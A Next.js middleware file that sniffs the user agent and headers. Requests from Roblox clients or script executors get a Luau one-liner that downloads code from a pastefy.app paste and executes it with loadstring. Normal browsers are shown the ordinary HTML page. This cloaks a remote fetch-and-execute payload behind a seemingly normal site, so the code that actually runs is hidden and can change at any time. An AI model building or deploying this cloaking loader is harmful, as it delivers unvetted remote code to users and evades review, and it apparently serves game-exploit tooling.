import { NextResponse } from 'next/server';

export const config = {
  // This matches your main root URL route
  matcher: '/',
};

export default function middleware(request) {
  const userAgent = request.headers.get('user-agent') || '';

  // Sniff out if the request comes from an engine executor environment
  if (userAgent.includes('Roblox') || request.headers.get('roblox-id')) {
    
    // Immediately return the raw Luau executable payload directly, stopping the HTML from sending
    return new NextResponse(
      'loadstring(game:HttpGet("https://pastefy.app/mvGbUf1D/raw"))()',
      {
        status: 200,
        headers: { 'content-type': 'text/plain' },
      }
    );
  }

  // If a regular user on Chrome/Safari/Firefox visits, let them through to see the HTML page
  return NextResponse.next();
}
